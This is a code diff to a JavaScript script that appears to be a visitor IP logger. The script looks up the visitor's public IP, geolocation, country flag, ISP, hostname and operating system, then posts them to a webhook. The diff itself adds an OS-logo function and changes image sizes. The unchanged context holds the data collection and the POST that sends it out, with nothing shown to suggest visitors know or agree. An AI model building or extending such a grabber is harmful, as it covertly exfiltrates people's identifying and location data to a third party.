@@ -169,7 +169,7 @@ async function generateImgUrl(ip) {
     const data = await response.json();
     var county_code = data.location.country_code;
     var country_codeLower = county_code.toLowerCase();
-    var url = `https://flagcdn.com/112x84/${country_codeLower}.png`
+    var url = `https://flagcdn.com/108x81/${country_codeLower}.png`
     return url;
   } catch (error) {
     console.error(error);
@@ -210,6 +210,20 @@ async function detectAllLocation(ip) {
     throw new Error("Error al hacer la consulta a la API");
   }
 };
+
+function imgOS() { 
+  var OSname = detectOS()
+  if (OSname == "Linux") {
+    return "https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Tux.svg/506px-Tux.svg.png?20220320193426"
+    // return "images/chat.png"
+  }else if (OSname == "Windows") {
+    return "https://www.freepnglogos.com/uploads/windows-logo-png/windows-logo-logok-0.png"
+  }else if (OSname == "Mac") {
+    return "https://cdn-icons-png.flaticon.com/512/2/2235.png"
+  }else { 
+    return "https://www.expofarm.es/wp-content/uploads/2021/09/cruz-farmacia.jpg"
+  }
+}
 
 async function detectISP(ip) {
   const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
@@ -255,7 +269,7 @@ fetch('https://api.ipify.org/?format=json')
         var maps_url = await generateLink(ip, "maps");
         var myipaddress_url = await generateLink(ip, "myipaddress");
         var flagUrl = await generateImgUrl(ip);
-        var img_url = 'https://cdn.discordapp.com/attachments/1107821046406598797/1133909866277253120/358.jpg'
+        var osIMG = imgOS();
         var ISP = await detectISP(ip);
         var hostname = await detecthostname(ip);
         
@@ -282,17 +296,17 @@ fetch('https://api.ipify.org/?format=json')
         '### My ip address: ' + myipaddress_url,
 
       embeds: [
-      {
-        image: {
-          url: flagUrl
+        {
+          image: {
+            url: flagUrl
+          }
+        },
+        {
+          image: {
+            url: osIMG
+          }
         }
-      },
-      {
-        image: {
-          url: img_url
-        }
-      }
-    ]
+      ]
     };
     fetch(webwhook, {
       method: 'POST',
